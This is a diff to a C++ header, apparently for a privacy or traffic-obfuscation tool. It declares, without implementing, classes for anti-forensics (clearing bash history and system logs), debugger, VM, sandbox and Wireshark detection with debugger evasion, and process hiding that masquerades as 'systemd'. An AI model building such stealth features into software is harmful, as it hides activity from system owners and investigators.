@@ -371,6 +371,110 @@ public:
 
 private:
     Config config_;
+
+// ===================== Anti-Forensics & Advanced Security =====================
+
+/**
+ * @brief Anti-forensics manager to prevent evidence collection
+ */
+class AntiForensics {
+public:
+    struct Config {
+        bool secure_delete = true;          // Overwrite deleted files
+        int overwrite_passes = 7;           // DoD 5220.22-M standard
+        bool clear_memory_on_exit = true;   // Zero sensitive memory
+        bool disable_core_dumps = true;     // Prevent core dumps
+        bool disable_swap = false;          // Disable swap (risky)
+        bool clear_temp_files = true;       // Clear temp files
+        bool clear_logs = false;            // Clear application logs
+    };
+    
+    AntiForensics();
+    explicit AntiForensics(const Config& config);
+    
+    // Secure file operations
+    bool secure_delete_file(const std::string& path);
+    bool secure_delete_directory(const std::string& path);
+    
+    // Memory protection
+    bool lock_memory(void* ptr, size_t size);     // Prevent swapping
+    bool unlock_memory(void* ptr, size_t size);
+    bool secure_zero_memory(void* ptr, size_t size);
+    
+    // Process protection
+    bool disable_ptrace();                         // Prevent debugging
+    bool enable_aslr();                            // Address space randomization
+    bool set_process_dumpable(bool dumpable);
+    
+    // Cleanup
+    bool clear_bash_history();
+    bool clear_system_logs();
+    bool clear_browser_cache();
+    
+private:
+    Config config_;
+};
+
+/**
+ * @brief System monitoring detection
+ */
+class MonitoringDetector {
+public:
+    struct ThreatInfo {
+        bool debugger_detected = false;
+        bool vm_detected = false;
+        bool sandbox_detected = false;
+        bool wireshark_detected = false;
+        bool process_monitor_detected = false;
+        std::vector<std::string> suspicious_processes;
+    };
+    
+    MonitoringDetector();
+    
+    // Detection methods
+    bool is_debugger_present();
+    bool is_running_in_vm();
+    bool is_running_in_sandbox();
+    bool is_network_monitored();
+    
+    ThreatInfo scan_threats();
+    
+    // Evasion
+    bool evade_debugger();
+    bool break_on_debug();
+    
+private:
+    bool check_debugger_linux();
+    bool check_vm_artifacts();
+    bool detect_wireshark();
+};
+
+/**
+ * @brief Process hiding and stealth
+ */
+class ProcessStealth {
+public:
+    struct Config {
+        bool hide_from_ps = false;          // Hide from process list
+        bool hide_network_conns = false;    // Hide network connections
+        bool fake_process_name = false;     // Masquerade as another process
+        std::string fake_name = "systemd";
+    };
+    
+    ProcessStealth();
+    
+    bool hide_process();
+    bool unhide_process();
+    
+    bool hide_network_connections();
+    bool set_fake_process_name(const std::string& name);
+    
+private:
+    Config config_;
+    std::string original_name_;
+};
+
+
     CertificatePinner cert_pinner_;
     LatencyMonitor latency_monitor_;
     TrafficPadder traffic_padder_;
